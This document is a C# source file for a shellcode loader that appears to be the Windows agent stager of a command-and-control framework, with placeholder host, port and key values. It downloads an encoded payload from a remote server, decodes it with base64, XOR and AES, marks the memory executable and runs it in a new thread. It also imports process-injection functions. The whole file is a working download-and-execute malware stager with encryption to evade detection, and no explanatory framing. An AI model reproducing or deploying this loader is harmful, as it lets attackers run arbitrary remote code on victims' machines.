using System;
using System.Net;
using System.Runtime.InteropServices;
using System.IO.MemoryMappedFiles;
using System.Text;
using System.Threading;

namespace ShellcodeLoader
{
    public class Loader
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
            uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
            byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess,
            IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,
            IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

        [DllImport("Kernel32.dll")]
        public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate void MyFunction();

        [DllImport("kernel32.dll")]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("bcrypt.dll")]
        public static extern uint BCryptOpenAlgorithmProvider(out IntPtr phAlgorithm, [MarshalAs(UnmanagedType.LPWStr)] string pszAlgId, [MarshalAs(UnmanagedType.LPWStr)] string pszImplementation, uint dwFlags);

        [DllImport("bcrypt.dll")]
        public static extern uint BCryptSetProperty(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbInput, uint cbInput, uint dwFlags);

        [DllImport("bcrypt.dll")]
        public static extern uint BCryptGenerateSymmetricKey(IntPtr hAlgorithm, out IntPtr phKey, IntPtr pbKeyObject, uint cbKeyObject, byte[] pbSecret, uint cbSecret, uint dwFlags);

        [DllImport("bcrypt.dll")]
        public static extern uint BCryptDecrypt(IntPtr hKey, byte[] pbInput, uint cbInput, IntPtr pPaddingInfo, byte[] pbIV, uint cbIV, byte[] pbOutput, uint cbOutput, out uint pcbResult, uint dwFlags);

        // XOR decryption
        private static byte[] XORDecrypt(byte[] data, byte[] key)
        {
            byte[] decrypted = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
            {
                decrypted[i] = (byte)(data[i] ^ key[i % key.Length]);
            }
            return decrypted;
        }

        [Flags]
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000,
            Decommit = 0x4000,
            Release = 0x8000,
            Reset = 0x80000,
            Physical = 0x400000,
            TopDown = 0x100000,
            WriteWatch = 0x200000,
            LargePages = 0x20000000
        }

        [Flags]
        public enum MemoryProtection
        {
            Execute = 0x10,
            ExecuteRead = 0x20,
            ExecuteReadWrite = 0x40,
            ExecuteWriteCopy = 0x80,
            NoAccess = 0x01,
            ReadOnly = 0x02,
            ReadWrite = 0x04,
            WriteCopy = 0x08,
            GuardModifierflag = 0x100,
            NoCacheModifierflag = 0x200,
            WriteCombineModifierflag = 0x400
        }

        public static string host = "<IP>";
        public static string port = "<PORT>";

        static byte[] getterShellcode()
        {
            byte[] shellcode;

            using (var client = new WebClient())
            {
                // Download the shellcode
                shellcode = client.DownloadData("http://" + host + ":" + port + "/agents/windows/cs");
            }

            // Base64 decoding
            shellcode = Convert.FromBase64String(Encoding.UTF8.GetString(shellcode));

            // XOR decryption
			var xorKey = Convert.FromBase64String("#1"); // XOR key
            shellcode = XORDecrypt(shellcode, xorKey);

            // AES decryption process
            var hAlgorithm = IntPtr.Zero;
            var ntStatus = BCryptOpenAlgorithmProvider(out hAlgorithm, "AES", null, 0);
            if (ntStatus != 0)
                throw new Exception("BCryptOpenAlgorithmProvider failed with status " + ntStatus);

            var chainingMode = Encoding.Unicode.GetBytes("ChainingModeCBC\0");
            ntStatus = BCryptSetProperty(hAlgorithm, "ChainingMode", chainingMode, (uint)chainingMode.Length, 0);
            if (ntStatus != 0)
                throw new Exception("BCryptSetProperty failed with status " + ntStatus);

			var key = Convert.FromBase64String("#2"); // AES-256 key
            var hKey = IntPtr.Zero;
            ntStatus = BCryptGenerateSymmetricKey(hAlgorithm, out hKey, IntPtr.Zero, 0, key, (uint)key.Length, 0);
            if (ntStatus != 0)
                throw new Exception("BCryptGenerateSymmetricKey failed with status " + ntStatus);

			var iv = Convert.FromBase64String("#3"); // AES IV
            var decryptedShellcode = new byte[shellcode.Length];
            uint decryptedShellcodeSize;
            ntStatus = BCryptDecrypt(hKey, shellcode, (uint)shellcode.Length, IntPtr.Zero, iv, (uint)iv.Length, decryptedShellcode, (uint)shellcode.Length, out decryptedShellcodeSize, 0);
            if (ntStatus != 0)
                throw new Exception("BCryptDecrypt failed with status " + ntStatus);

            shellcode = decryptedShellcode;

            return shellcode;
        }

        static void Main(string[] args)
        {

            byte[] shellcode = getterShellcode();

            var baseAddress = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ReadWrite);

            // Copy the shellcode into the memory region
            Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);

            // For VirtualProtect
            uint oldProtect;
            VirtualProtect(baseAddress, (uint)shellcode.Length, (uint)MemoryProtection.ExecuteRead, out oldProtect);

            // For CreateThread
            IntPtr threadId;
            var hThread = CreateThread(IntPtr.Zero, 0, baseAddress, IntPtr.Zero, 0, out threadId);

            // Wait infinitely on this thread to stop the process exiting
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
